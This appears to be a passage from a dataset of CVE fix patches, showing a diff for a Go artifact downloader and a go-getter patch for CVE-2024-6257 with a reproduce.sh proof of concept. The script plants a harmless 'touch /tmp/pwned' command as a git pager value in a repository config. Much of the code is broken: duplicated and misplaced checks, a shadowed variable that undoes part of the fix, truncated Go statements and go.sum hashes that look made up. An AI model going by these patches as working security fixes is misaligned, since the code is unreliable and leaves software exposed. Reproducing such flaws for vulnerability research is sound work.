opts.IO.StartProgressIndicator()\n+if a.Name == \".\" || a.Name == \"..\" || strings.ContainsAny(a.Name, \"/\\\\\") {\n+if opts.IO.IsStderrTTY() {\n+fmt.Fprintf(opts.IO.ErrOut, \"warning: skipping artifact %q with invalid name\\n\", a.Name)\n+}\n+continue\n+}\n+        defer opts.IO.StopProgressIndicator()\n+\n+        // track downloaded artifacts and avoid re-downloading any of the same name\n+        downloaded := set.NewStringSet()\n+        for _, a := range artifacts {\n+                if a.Expired {\n+                        continue\n+                if a.Name == \".\" || a.Name == \"..\" || strings.ContainsAny(a.Name, \"/\\\\\") {\n+                        if opts.IO.IsStderrTTY() {\n+                                fmt.Fprintf(opts.IO.ErrOut, \"warning: skipping artifact %q with invalid name\\n\", a.Name)\n+                        }\n+                        continue\n+                }\n+                }\n+                if downloaded.Contains(a.Name) {\n+                        continue\n+                }\n+                if len(wantNames) > 0 || len(wantPatterns) > 0 {\n+                        if !matchAnyName(wantNames, a.Name) && !matchAnyPattern(wantPatterns, a.Name) {\n+                                continue\n+                        }\n+                }\n+                destDir := opts.DestinationDir\n+                if len(wantPatterns) != 0 || len(wantNames) != 1 {\n+                        destDir = filepath.Join(destDir, a.Name)\n+                }\n+                err := opts.Platform.Download(a.DownloadURL, destDir)\n+                if err != nil {\n+                        return fmt.Errorf(\"error downloading %s: %w\", a.Name, err)\n+                }\n+                downloaded.Add(a.Name)\n+        }\n+\n+        if downloaded.Len() == 0 {\n+                return errors.New(\"no artifact matches any of the names or patterns provided\")\n+        }\n+\n+        return nil\n }\n \n func matchAnyName(names []string, name string) bool {\n-\tfor _, n := range names {\n-\t\tif name == n {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        for _, n := range names {\n+                if name == n {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n func matchAnyPattern(patterns []string, name string) bool {\n-\tfor _, p := range patterns {\n-\t\tif isMatch, err := filepath.Match(p, name); err == nil && isMatch {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        for _, p := range patterns {\n+                if isMatch, err := filepath.Match(p, name); err == nil && isMatch {\n+                        return true\n+                }\n+        }\n+        return false\n }\n"}
{"cve":"CVE-2024-6257:0708", "fix_patch": "diff --git a/get_git.go b/get_git.go\nindex 908493b..3e21ebf 100644\n--- a/get_git.go\n+++ b/get_git.go\n@@ -1,182 +1,182 @@\n package getter\n \n import (\n-\t\"bytes\"\n-\t\"context\"\n-\t\"encoding/base64\"\n-\t\"fmt\"\n-\t\"io/ioutil\"\n-\t\"net/url\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"path/filepath\"\n-\t\"regexp\"\n-\t\"runtime\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\turlhelper \"github.com/hashicorp/go-getter/helper/url\"\n-\tsafetemp \"github.com/hashicorp/go-safetemp\"\n-\tversion \"github.com/hashicorp/go-version\"\n+        \"bytes\"\n+        \"context\"\n+        \"encoding/base64\"\n+        \"fmt\"\n+        \"io/ioutil\"\n+        \"net/url\"\n+        \"os\"\n+        \"os/exec\"\n+        \"path/filepath\"\n+        \"regexp\"\n+        \"runtime\"\n+        \"strconv\"\n+        \"strings\"\n+        \"time\"\n+\n+        urlhelper \"github.com/hashicorp/go-getter/helper/url\"\n+        safetemp \"github.com/hashicorp/go-safetemp\"\n+        version \"github.com/hashicorp/go-version\"\n )\n \n // GitGetter is a Getter implementation that will download a module from\n // a git repository.\n type GitGetter struct {\n-\tgetter\n+        getter\n \n-\t// Timeout sets a deadline which all git CLI operations should\n-\t// complete within. Zero value means no timeout.\n-\tTimeout time.Duration\n+        // Timeout sets a deadline which all git CLI operations should\n+        // complete within. Zero value means no timeout.\n+        Timeout time.Duration\n }\n \n var defaultBranchRegexp = regexp.MustCompile(`\\s->\\sorigin/(.*)`)\n var lsRemoteSymRefRegexp = regexp.MustCompile(`ref: refs/heads/([^\\s]+).*`)\n \n func (g *GitGetter) ClientMode(_ *url.URL) (ClientMode, error) {\n-\treturn ClientModeDir, nil\n+        return ClientModeDir, nil\n }\n \n func (g *GitGetter) Get(dst string, u *url.URL) error {\n-\tctx := g.Context()\n-\n-\tif g.Timeout > 0 {\n-\t\tvar cancel context.CancelFunc\n-\t\tctx, cancel = context.WithTimeout(ctx, g.Timeout)\n-\t\tdefer cancel()\n-\t}\n-\n-\tif _, err := exec.LookPath(\"git\"); err != nil {\n-\t\treturn fmt.Errorf(\"git must be available and on the PATH\")\n-\t}\n-\n-\t// The port number must be parseable as an integer. If not, the user\n-\t// was probably trying to use a scp-style address, in which case the\n-\t// ssh:// prefix must be removed to indicate that.\n-\t//\n-\t// This is not necessary in versions of Go which have patched\n-\t// CVE-2019-14809 (e.g. Go 1.12.8+)\n-\tif portStr := u.Port(); portStr != \"\" {\n-\t\tif _, err := strconv.ParseUint(portStr, 10, 16); err != nil {\n-\t\t\treturn fmt.Errorf(\"invalid port number %q; if using the \\\"scp-like\\\" git address scheme where a colon introduces the path instead, remove the ssh:// portion and use just the git:: prefix\", portStr)\n-\t\t}\n-\t}\n-\n-\t// Extract some query parameters we use\n-\tvar ref, sshKey string\n-\tdepth := 0 // 0 means \"don't use shallow clone\"\n-\tq := u.Query()\n-\tif len(q) > 0 {\n-\t\tref = q.Get(\"ref\")\n-\t\tq.Del(\"ref\")\n-\n-\t\tsshKey = q.Get(\"sshkey\")\n-\t\tq.Del(\"sshkey\")\n-\n-\t\tif n, err := strconv.Atoi(q.Get(\"depth\")); err == nil {\n-\t\t\tdepth = n\n-\t\t}\n-\t\tq.Del(\"depth\")\n-\n-\t\t// Copy the URL\n-\t\tvar newU url.URL = *u\n-\t\tu = &newU\n-\t\tu.RawQuery = q.Encode()\n-\t}\n-\n-\tvar sshKeyFile string\n-\tif sshKey != \"\" {\n-\t\t// Check that the git version is sufficiently new.\n-\t\tif err := checkGitVersion(ctx, \"2.3\"); err != nil {\n-\t\t\treturn fmt.Errorf(\"Error using ssh key: %v\", err)\n-\t\t}\n-\n-\t\t// We have an SSH key - decode it.\n-\t\traw, err := base64.StdEncoding.DecodeString(sshKey)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\t// Create a temp file for the key and ensure it is removed.\n-\t\tfh, err := ioutil.TempFile(\"\", \"go-getter\")\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tsshKeyFile = fh.Name()\n-\t\tdefer os.Remove(sshKeyFile)\n-\n-\t\t// Set the permissions prior to writing the key material.\n-\t\tif err := os.Chmod(sshKeyFile, 0600); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\t// Write the raw key into the temp file.\n-\t\t_, err = fh.Write(raw)\n-\t\tfh.Close()\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\t// Clone or update the repository\n-\t_, err := os.Stat(dst)\n-\tif err != nil && !os.IsNotExist(err) {\n-\t\treturn err\n-\t}\n-\tif err == nil {\n-\t\terr = g.update(ctx, dst, sshKeyFile, ref, depth)\n-\t} else {\n-\t\terr = g.clone(ctx, dst, sshKeyFile, u, ref, depth)\n-\t}\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Next: check out the proper tag/branch if it is specified, and checkout\n-\tif ref != \"\" {\n-\t\tif err := g.checkout(ctx, dst, ref); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\t// Lastly, download any/all submodules.\n-\treturn g.fetchSubmodules(ctx, dst, sshKeyFile, depth)\n+        ctx := g.Context()\n+\n+        if g.Timeout > 0 {\n+                var cancel context.CancelFunc\n+                ctx, cancel = context.WithTimeout(ctx, g.Timeout)\n+                defer cancel()\n+        }\n+\n+        if _, err := exec.LookPath(\"git\"); err != nil {\n+                return fmt.Errorf(\"git must be available and on the PATH\")\n+        }\n+\n+        // The port number must be parseable as an integer. If not, the user\n+        // was probably trying to use a scp-style address, in which case the\n+        // ssh:// prefix must be removed to indicate that.\n+        //\n+        // This is not necessary in versions of Go which have patched\n+        // CVE-2019-14809 (e.g. Go 1.12.8+)\n+        if portStr := u.Port(); portStr != \"\" {\n+                if _, err := strconv.ParseUint(portStr, 10, 16); err != nil {\n+                        return fmt.Errorf(\"invalid port number %q; if using the \\\"scp-like\\\" git address scheme where a colon introduces the path instead, remove the ssh:// portion and use just the git:: prefix\", portStr)\n+                }\n+        }\n+\n+        // Extract some query parameters we use\n+        var ref, sshKey string\n+        depth := 0 // 0 means \"don't use shallow clone\"\n+        q := u.Query()\n+        if len(q) > 0 {\n+                ref = q.Get(\"ref\")\n+                q.Del(\"ref\")\n+\n+                sshKey = q.Get(\"sshkey\")\n+                q.Del(\"sshkey\")\n+\n+                if n, err := strconv.Atoi(q.Get(\"depth\")); err == nil {\n+                        depth = n\n+                }\n+                q.Del(\"depth\")\n+\n+                // Copy the URL\n+                var newU url.URL = *u\n+                u = &newU\n+                u.RawQuery = q.Encode()\n+        }\n+\n+        var sshKeyFile string\n+        if sshKey != \"\" {\n+                // Check that the git version is sufficiently new.\n+                if err := checkGitVersion(ctx, \"2.3\"); err != nil {\n+                        return fmt.Errorf(\"Error using ssh key: %v\", err)\n+                }\n+\n+                // We have an SSH key - decode it.\n+                raw, err := base64.StdEncoding.DecodeString(sshKey)\n+                if err != nil {\n+                        return err\n+                }\n+\n+                // Create a temp file for the key and ensure it is removed.\n+                fh, err := ioutil.TempFile(\"\", \"go-getter\")\n+                if err != nil {\n+                        return err\n+                }\n+                sshKeyFile = fh.Name()\n+                defer os.Remove(sshKeyFile)\n+\n+                // Set the permissions prior to writing the key material.\n+                if err := os.Chmod(sshKeyFile, 0600); err != nil {\n+                        return err\n+                }\n+\n+                // Write the raw key into the temp file.\n+                _, err = fh.Write(raw)\n+                fh.Close()\n+                if err != nil {\n+                        return err\n+                }\n+        }\n+\n+        // Clone or update the repository\n+        _, err := os.Stat(dst)\n+        if err != nil && !os.IsNotExist(err) {\n+                return err\n+        }\n+        if err == nil {\n+                err = g.update(ctx, dst, sshKeyFile, ref, depth)\n+        } else {\n+                err = g.clone(ctx, dst, sshKeyFile, u, ref, depth)\n+        }\n+        if err != nil {\n+                return err\n+        }\n+\n+        // Next: check out the proper tag/branch if it is specified, and checkout\n+        if ref != \"\" {\n+                if err := g.checkout(ctx, dst, ref); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        // Lastly, download any/all submodules.\n+        return g.fetchSubmodules(ctx, dst, sshKeyFile, depth)\n }\n \n // GetFile for Git doesn't support updating at this time. It will download\n // the file every time.\n func (g *GitGetter) GetFile(dst string, u *url.URL) error {\n-\ttd, tdcloser, err := safetemp.Dir(\"\", \"getter\")\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer tdcloser.Close()\n-\n-\t// Get the filename, and strip the filename from the URL so we can\n-\t// just get the repository directly.\n-\tfilename := filepath.Base(u.Path)\n-\tu.Path = filepath.Dir(u.Path)\n-\n-\t// Get the full repository\n-\tif err := g.Get(td, u); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Copy the single file\n-\tu, err = urlhelper.Parse(fmtFileURL(filepath.Join(td, filename)))\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tfg := &FileGetter{Copy: true}\n-\treturn fg.GetFile(dst, u)\n+        td, tdcloser, err := safetemp.Dir(\"\", \"getter\")\n+        if err != nil {\n+                return err\n+        }\n+        defer tdcloser.Close()\n+\n+        // Get the filename, and strip the filename from the URL so we can\n+        // just get the repository directly.\n+        filename := filepath.Base(u.Path)\n+        u.Path = filepath.Dir(u.Path)\n+\n+        // Get the full repository\n+        if err := g.Get(td, u); err != nil {\n+                return err\n+        }\n+\n+        // Copy the single file\n+        u, err = urlhelper.Parse(fmtFileURL(filepath.Join(td, filename)))\n+        if err != nil {\n+                return err\n+        }\n+\n+        fg := &FileGetter{Copy: true}\n+        return fg.GetFile(dst, u)\n }\n \n func (g *GitGetter) checkout(ctx context.Context, dst string, ref string) error {\n-\tcmd := exec.CommandContext(ctx, \"git\", \"checkout\", ref)\n-\tcmd.Dir = dst\n-\treturn getRunCommand(cmd)\n+        cmd := exec.CommandContext(ctx, \"git\", \"-c\", \"core.pager=cat\", \"checkout\", ref)\n+        cmd.Dir = dst\n+        return getRunCommand(cmd)\n }\n \n // gitCommitIDRegex is a pattern intended to match strings that seem\n@@ -190,190 +190,190 @@ func (g *GitGetter) checkout(ctx context.Context, dst string, ref string) error\n var gitCommitIDRegex = regexp.MustCompile(\"^[0-9a-fA-F]{7,40}$\")\n \n func (g *GitGetter) clone(ctx context.Context, dst, sshKeyFile string, u *url.URL, ref string, depth int) error {\n-\targs := []string{\"clone\"}\n-\n-\toriginalRef := ref // we handle an unspecified ref differently than explicitly selecting the default branch below\n-\tif ref == \"\" {\n-\t\tref = findRemoteDefaultBranch(ctx, u)\n-\t}\n-\tif depth > 0 {\n-\t\targs = append(args, \"--depth\", strconv.Itoa(depth))\n-\t\targs = append(args, \"--branch\", ref)\n-\t}\n-\targs = append(args, u.String(), dst)\n-\n-\tcmd := exec.CommandContext(ctx, \"git\", args...)\n-\tsetupGitEnv(cmd, sshKeyFile)\n-\terr := getRunCommand(cmd)\n-\tif err != nil {\n-\t\tif depth > 0 && originalRef != \"\" {\n-\t\t\t// If we're creating a shallow clone then the given ref must be\n-\t\t\t// a named ref (branch or tag) rather than a commit directly.\n-\t\t\t// We can't accurately recognize the resulting error here without\n-\t\t\t// hard-coding assumptions about git's human-readable output, but\n-\t\t\t// we can at least try a heuristic.\n-\t\t\tif gitCommitIDRegex.MatchString(originalRef) {\n-\t\t\t\treturn fmt.Errorf(\"%w (note that setting 'depth' requires 'ref' to be a branch or tag name)\", err)\n-\t\t\t}\n-\t\t}\n-\t\treturn err\n-\t}\n-\n-\tif depth < 1 && originalRef != \"\" {\n-\t\t// If we didn't add --depth and --branch above then we will now be\n-\t\t// on the remote repository's default branch, rather than the selected\n-\t\t// ref, so we'll need to fix that before we return.\n-\t\treturn g.checkout(ctx, dst, originalRef)\n-\t}\n-\treturn nil\n+        args := []string{\"-c\", \"core.pager=cat\", \"clone\"}\n+\n+        originalRef := ref // we handle an unspecified ref differently than explicitly selecting the default branch below\n+        if ref == \"\" {\n+                ref = findRemoteDefaultBranch(ctx, u)\n+        }\n+        if depth > 0 {\n+                args = append(args, \"--depth\", strconv.Itoa(depth))\n+                args = append(args, \"--branch\", ref)\n+        }\n+        args = append(args, u.String(), dst)\n+\n+        cmd := exec.CommandContext(ctx, \"git\", args...)\n+        setupGitEnv(cmd, sshKeyFile)\n+        err := getRunCommand(cmd)\n+        if err != nil {\n+                if depth > 0 && originalRef != \"\" {\n+                        // If we're creating a shallow clone then the given ref must be\n+                        // a named ref (branch or tag) rather than a commit directly.\n+                        // We can't accurately recognize the resulting error here without\n+                        // hard-coding assumptions about git's human-readable output, but\n+                        // we can at least try a heuristic.\n+                        if gitCommitIDRegex.MatchString(originalRef) {\n+                                return fmt.Errorf(\"%w (note that setting 'depth' requires 'ref' to be a branch or tag name)\", err)\n+                        }\n+                }\n+                return err\n+        }\n+\n+        if depth < 1 && originalRef != \"\" {\n+                // If we didn't add --depth and --branch above then we will now be\n+                // on the remote repository's default branch, rather than the selected\n+                // ref, so we'll need to fix that before we return.\n+                return g.checkout(ctx, dst, originalRef)\n+        }\n+        return nil\n }\n \n func (g *GitGetter) update(ctx context.Context, dst, sshKeyFile, ref string, depth int) error {\n-\t// Determine if we're a branch. If we're NOT a branch, then we just\n-\t// switch to master prior to checking out\n-\tcmd := exec.CommandContext(ctx, \"git\", \"show-ref\", \"-q\", \"--verify\", \"refs/heads/\"+ref)\n-\tcmd.Dir = dst\n-\n-\tif getRunCommand(cmd) != nil {\n-\t\t// Not a branch, switch to default branch. This will also catch\n-\t\t// non-existent branches, in which case we want to switch to default\n-\t\t// and then checkout the proper branch later.\n-\t\tref = findDefaultBranch(ctx, dst)\n-\t}\n-\n-\t// We have to be on a branch to pull\n-\tif err := g.checkout(ctx, dst, ref); err != nil {\n-\t\treturn err\n-\t}\n-\n-\tif depth > 0 {\n-\t\tcmd = exec.CommandContext(ctx, \"git\", \"pull\", \"--depth\", strconv.Itoa(depth), \"--ff-only\")\n-\t} else {\n-\t\tcmd = exec.CommandContext(ctx, \"git\", \"pull\", \"--ff-only\")\n-\t}\n-\n-\tcmd.Dir = dst\n-\tsetupGitEnv(cmd, sshKeyFile)\n-\treturn getRunCommand(cmd)\n+        // Determine if we're a branch. If we're NOT a branch, then we just\n+        // switch to master prior to checking out\n+        cmd := exec.CommandContext(ctx, \"git\", \"-c\", \"core.pager=cat\", \"show-ref\", \"-q\", \"--verify\", \"refs/heads/\"+ref)\n+        cmd.Dir = dst\n+\n+        if getRunCommand(cmd) != nil {\n+                // Not a branch, switch to default branch. This will also catch\n+                // non-existent branches, in which case we want to switch to default\n+                // and then checkout the proper branch later.\n+                ref = findDefaultBranch(ctx, dst)\n+        }\n+\n+        // We have to be on a branch to pull\n+        if err := g.checkout(ctx, dst, ref); err != nil {\n+                return err\n+        }\n+\n+        if depth > 0 {\n+                cmd = exec.CommandContext(ctx, \"git\", \"pull\", \"--depth\", strconv.Itoa(depth), \"--ff-only\")\n+        } else {\n+        cmd := exec.CommandContext(ctx, \"git\", \"-c\", \"core.pager=cat\", \"pull\", \"--ff-only\")\n+        }\n+\n+        cmd.Dir = dst\n+        setupGitEnv(cmd, sshKeyFile)\n+        return getRunCommand(cmd)\n }\n \n // fetchSubmodules downloads any configured submodules recursively.\n func (g *GitGetter) fetchSubmodules(ctx context.Context, dst, sshKeyFile string, depth int) error {\n-\targs := []string{\"submodule\", \"update\", \"--init\", \"--recursive\"}\n-\tif depth > 0 {\n-\t\targs = append(args, \"--depth\", strconv.Itoa(depth))\n-\t}\n-\tcmd := exec.CommandContext(ctx, \"git\", args...)\n-\tcmd.Dir = dst\n-\tsetupGitEnv(cmd, sshKeyFile)\n-\treturn getRunCommand(cmd)\n+        args := []string{\"-c\", \"core.pager=cat\", \"submodule\", \"update\", \"--init\", \"--recursive\"}\n+        if depth > 0 {\n+                args = append(args, \"--depth\", strconv.Itoa(depth))\n+        }\n+        cmd := exec.CommandContext(ctx, \"git\", args...)\n+        cmd.Dir = dst\n+        setupGitEnv(cmd, sshKeyFile)\n+        return getRunCommand(cmd)\n }\n \n // findDefaultBranch checks the repo's origin remote for its default branch\n // (generally \"master\"). \"master\" is returned if an origin default branch\n // can't be determined.\n func findDefaultBranch(ctx context.Context, dst string) string {\n-\tvar stdoutbuf bytes.Buffer\n-\tcmd := exec.CommandContext(ctx, \"git\", \"branch\", \"-r\", \"--points-at\", \"refs/remotes/origin/HEAD\")\n-\tcmd.Dir = dst\n-\tcmd.Stdout = &stdoutbuf\n-\terr := cmd.Run()\n-\tmatches := defaultBranchRegexp.FindStringSubmatch(stdoutbuf.String())\n-\tif err != nil || matches == nil {\n-\t\treturn \"master\"\n-\t}\n-\treturn matches[len(matches)-1]\n+        var stdoutbuf bytes.Buffer\n+        cmd := exec.CommandContext(ctx, \"git\", \"-c\", \"core.pager=cat\", \"branch\", \"-r\", \"--points-at\", \"refs/remotes/origin/HEAD\")\n+        cmd.Dir = dst\n+        cmd.Stdout = &stdoutbuf\n+        err := cmd.Run()\n+        matches := defaultBranchRegexp.FindStringSubmatch(stdoutbuf.String())\n+        if err != nil || matches == nil {\n+                return \"master\"\n+        }\n+        return matches[len(matches)-1]\n }\n \n // findRemoteDefaultBranch checks the remote repo's HEAD symref to return the remote repo's\n // default branch. \"master\" is returned if no HEAD symref exists.\n func findRemoteDefaultBranch(ctx context.Context, u *url.URL) string {\n-\tvar stdoutbuf bytes.Buffer\n-\tcmd := exec.CommandContext(ctx, \"git\", \"ls-remote\", \"--symref\", u.String(), \"HEAD\")\n-\tcmd.Stdout = &stdoutbuf\n-\terr := cmd.Run()\n-\tmatches := lsRemoteSymRefRegexp.FindStringSubmatch(stdoutbuf.String())\n-\tif err != nil || matches == nil {\n-\t\treturn \"master\"\n-\t}\n-\treturn matches[len(matches)-1]\n+        var stdoutbuf bytes.Buffer\n+        cmd := exec.CommandContext(ctx, \"git\", \"-c\", \"core.pager=cat\", \"ls-remote\", \"--symref\", u.String(), \"HEAD\")\n+        cmd.Stdout = &stdoutbuf\n+        err := cmd.Run()\n+        matches := lsRemoteSymRefRegexp.FindStringSubmatch(stdoutbuf.String())\n+        if err != nil || matches == nil {\n+                return \"master\"\n+        }\n+        return matches[len(matches)-1]\n }\n \n // setupGitEnv sets up the environment for the given command. This is used to\n // pass configuration data to git and ssh and enables advanced cloning methods.\n func setupGitEnv(cmd *exec.Cmd, sshKeyFile string) {\n-\t// If there's no sshKeyFile argument to deal with, we can skip this\n-\t// entirely.\n-\tif sshKeyFile == \"\" {\n-\t\treturn\n-\t}\n-\tconst gitSSHCommand = \"GIT_SSH_COMMAND=\"\n-\tvar sshCmd []string\n-\n-\t// If we have an existing GIT_SSH_COMMAND, we need to append our options.\n-\t// We will also remove our old entry to make sure the behavior is the same\n-\t// with versions of Go < 1.9.\n-\tenv := os.Environ()\n-\tfor i, v := range env {\n-\t\tif strings.HasPrefix(v, gitSSHCommand) && len(v) > len(gitSSHCommand) {\n-\t\t\tsshCmd = []string{v}\n-\n-\t\t\tenv[i], env[len(env)-1] = env[len(env)-1], env[i]\n-\t\t\tenv = env[:len(env)-1]\n-\t\t\tbreak\n-\t\t}\n-\t}\n-\n-\tif len(sshCmd) == 0 {\n-\t\tsshCmd = []string{gitSSHCommand + \"ssh\"}\n-\t}\n-\n-\t// We have an SSH key temp file configured, tell ssh about this.\n-\tif runtime.GOOS == \"windows\" {\n-\t\tsshKeyFile = strings.Replace(sshKeyFile, `\\`, `/`, -1)\n-\t}\n-\tsshCmd = append(sshCmd, \"-i\", sshKeyFile)\n-\tenv = append(env, strings.Join(sshCmd, \" \"))\n-\n-\tcmd.Env = env\n+        // If there's no sshKeyFile argument to deal with, we can skip this\n+        // entirely.\n+        if sshKeyFile == \"\" {\n+                return\n+        }\n+        const gitSSHCommand = \"GIT_SSH_COMMAND=\"\n+        var sshCmd []string\n+\n+        // If we have an existing GIT_SSH_COMMAND, we need to append our options.\n+        // We will also remove our old entry to make sure the behavior is the same\n+        // with versions of Go < 1.9.\n+        env := os.Environ()\n+        for i, v := range env {\n+                if strings.HasPrefix(v, gitSSHCommand) && len(v) > len(gitSSHCommand) {\n+                        sshCmd = []string{v}\n+\n+                        env[i], env[len(env)-1] = env[len(env)-1], env[i]\n+                        env = env[:len(env)-1]\n+                        break\n+                }\n+        }\n+\n+        if len(sshCmd) == 0 {\n+                sshCmd = []string{gitSSHCommand + \"ssh\"}\n+        }\n+\n+        // We have an SSH key temp file configured, tell ssh about this.\n+        if runtime.GOOS == \"windows\" {\n+                sshKeyFile = strings.Replace(sshKeyFile, `\\`, `/`, -1)\n+        }\n+        sshCmd = append(sshCmd, \"-i\", sshKeyFile)\n+        env = append(env, strings.Join(sshCmd, \" \"))\n+\n+        cmd.Env = env\n }\n \n // checkGitVersion is used to check the version of git installed on the system\n // against a known minimum version. Returns an error if the installed version\n // is older than the given minimum.\n func checkGitVersion(ctx context.Context, min string) error {\n-\twant, err := version.NewVersion(min)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tout, err := exec.CommandContext(ctx, \"git\", \"version\").Output()\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tfields := strings.Fields(string(out))\n-\tif len(fields) < 3 {\n-\t\treturn fmt.Errorf(\"Unexpected 'git version' output: %q\", string(out))\n-\t}\n-\tv := fields[2]\n-\tif runtime.GOOS == \"windows\" && strings.Contains(v, \".windows.\") {\n-\t\t// on windows, git version will return for example:\n-\t\t// git version 2.20.1.windows.1\n-\t\t// Which does not follow the semantic versionning specs\n-\t\t// https://semver.org. We remove that part in order for\n-\t\t// go-version to not error.\n-\t\tv = v[:strings.Index(v, \".windows.\")]\n-\t}\n-\n-\thave, err := version.NewVersion(v)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tif have.LessThan(want) {\n-\t\treturn fmt.Errorf(\"Required git version = %s, have %s\", want, have)\n-\t}\n-\n-\treturn nil\n+        want, err := version.NewVersion(min)\n+        if err != nil {\n+                return err\n+        }\n+\n+        out, err := exec.CommandContext(ctx, \"git\", \"-c\", \"core.pager=cat\", \"version\").Output()\n+        if err != nil {\n+                return err\n+        }\n+\n+        fields := strings.Fields(string(out))\n+        if len(fields) < 3 {\n+                return fmt.Errorf(\"Unexpected 'git version' output: %q\", string(out))\n+        }\n+        v := fields[2]\n+        if runtime.GOOS == \"windows\" && strings.Contains(v, \".windows.\") {\n+                // on windows, git version will return for example:\n+                // git version 2.20.1.windows.1\n+                // Which does not follow the semantic versionning specs\n+                // https://semver.org. We remove that part in order for\n+                // go-version to not error.\n+                v = v[:strings.Index(v, \".windows.\")]\n+        }\n+\n+        have, err := version.NewVersion(v)\n+        if err != nil {\n+                return err\n+        }\n+\n+        if have.LessThan(want) {\n+                return fmt.Errorf(\"Required git version = %s, have %s\", want, have)\n+        }\n+\n+        return nil\n }\ndiff --git a/reproduce.sh b/reproduce.sh\nnew file mode 100755\nindex 0000000..3387550\n--- /dev/null\n+++ b/reproduce.sh\n@@ -0,0 +1,119 @@\n+#!/bin/bash\n+\n+# Exit on error\n+set -e\n+\n+# 1. Prepare malicious git repository\n+echo \"Setting up malicious git repository...\"\n+rm -rf /tmp/malicious-repo /tmp/pwned /tmp/repo\n+mkdir -p /tmp/malicious-repo\n+cd /tmp/malicious-repo\n+git init -b main\n+git config --local user.email \"test@example.com\"\n+git config --local user.name \"Test\"\n+echo \"content\" > file\n+git add file\n+git commit -m \"initial commit\"\n+# Malicious git config\n+# When `git pull` is run, it might invoke a pager. We're setting the pager to a malicious command.\n+echo '[core]' >> .git/config\n+echo '    pager = \"touch /tmp/pwned #'' >> .git/config\n+echo \"Malicious repo setup complete.\"\n+\n+\n+# 2. Prepare the go-getter client\n+echo \"Setting up go-getter client...\"\n+mkdir -p /tmp/reproducer\n+cd /tmp/reproducer\n+# The go program that uses go-getter\n+cat > reproduce.go <<EOF\n+package main\n+\n+import (\n+\"log\"\n+getter \"github.com/hashicorp/go-getter\"\n+)\n+\n+func main() {\n+dst := \"/tmp/repo\"\n+url := \"file:///tmp/malicious-repo\"\n+\n+log.Println(\"Cloning malicious repository...\")\n+err := getter.Get(dst, url)\n+if err != nil {\n+clone: %v\", err)\n+}\n+log.Println(\"Clone successful.\")\n+\n+// Add a new commit to the malicious repo so we have something to pull\n+// This will be done in the shell script\n+\n+log.Println(\"Updating repository (this is where the vulnerability should be triggered)...\")\n+err = getter.Get(dst, url)\n+if err != nil {\n+tf(\"Update failed: %v\", err)\n+} else {\n+tln(\"Update successful.\")\n+}\n+}\n+EOF\n+\n+# Go module setup\n+cat > go.mod <<EOF\n+module reproduce\n+\n+go 1.18\n+\n+require github.com/hashicorp/go-getter v1.7.4\n+\n+replace github.com/hashicorp/go-getter => /workspace/go-getter\n+EOF\n+\n+cat > go.sum << EOF\n+github.com/aws/aws-sdk-go v1.37.0 h1:U/DRKDR2P05xILjYK3QJ7daS1iDC2WbAhT22I/QuWJI=\n+github.com/aws/aws-sdk-go v1.44.19 h1:18+h43r8g5T+5T+rSSuuaq18yD5pI3e+oRy2XJrFhL4=\n+github.com/aws/aws-sdk-go v1.44.19/go.mod h1:uprpG41L2A71sLeC5g6gT15s2xyC3qklL2+vUtaIWtU=\n+github.com/aws/jmespath v0.4.0 h1:g3rVc+a0OuI3L4RGW5AdI4BEX9r2sS93bRgPAXXp494=\n+github.com/aws/jmespath v0.4.0/go.mod h1:3213jpGaj4s3EVg0Mwhd0c20I8MCJ6zruI/2Q62tAo0=\n+github.com/bgentry/go-netrc v0.0.0-20140422174119-9fd32a8b0d3d h1:i6S+1v6A88LzCynq1wKjF/22hO33qX+pYCanlHHDs+A=\n+github.com/bgentry/go-netrc v0.0.0-20140422174119-9fd32a8b0d3d/go.mod h1:i5iOdnp36G8jyauNDJnaPqg8Vj2wCQ2eC6N1QxW3+4M=\n+github.com/golang/groupcache v0.0.0-20200121045136-8c9f03a8e57e h1:3rLfn+3mK2xVByr8s+dSCnrjXQoSm8AxDG5eS+w/0LA=\n+github.com/golang/groupcache v0.0.0-20200121045136-8c9f03a8e57e/go.mod h1:GK+oP53ryVI0i8bLg20042hFvqDTB+5lPqQ6TBZp+e4=\n+github.com/golang/protobuf v1.3.2 h1:6nsPYzhq5kReh6QImI3k5qWzO4PEb5S1psShqS+Y2CY=\n+github.com/golang/protobuf v1.3.2/go.mod h1:6lQm24f68PqTj//qTrymuA2dYmRzdeaVZpEu6wLq3dE=\n+github.com/google/go-cmp v0.5.5 h1:KhPXSW3OQldo7fV3Q03urqQLY59Jhrqwrdh3rB25iHw=\n+github.com/google/go-cmp v0.5.5/go.mod h1:v+go302FFS2mEaK2dD82JpWK800YrygH75uFygVDOx8=\n+github.com/google/go-querystring v1.1.0 h1:SzMNg3s8HqStYycYg7sXg0Nqtl4dY2N4wH2aGzG24PI=\n+github.com/google/go-querystring v1.1.0/go.mod h1:2jPMA00tSvsMTn85l1B+9FhJaK42FEPP0sX7v60GqgE=\n+gopkg.in/ini.v1 v1.51.0/go.mod h1:jzx+0TldB/GjGgEpo+jJldq7bLeK30t6h/ZWkR1mEIM=\n+gopkg.in/yaml.v2 v2.2.8/go.mod h1:hMqYTTNjvJ6tDtBC3zN/6Vp9kMcrq2jARmFUeCbGPL0=\n+EOF\n+\n+# 3. Run the test\n+echo \"Running reproducer...\"\n+# Change directory to the go-getter repo to install dependencies\n+cd /workspace/go-getter\n+# The reproducer will fail if we don't have the dependencies.\n+# The dependencies are in go.sum, so we can run 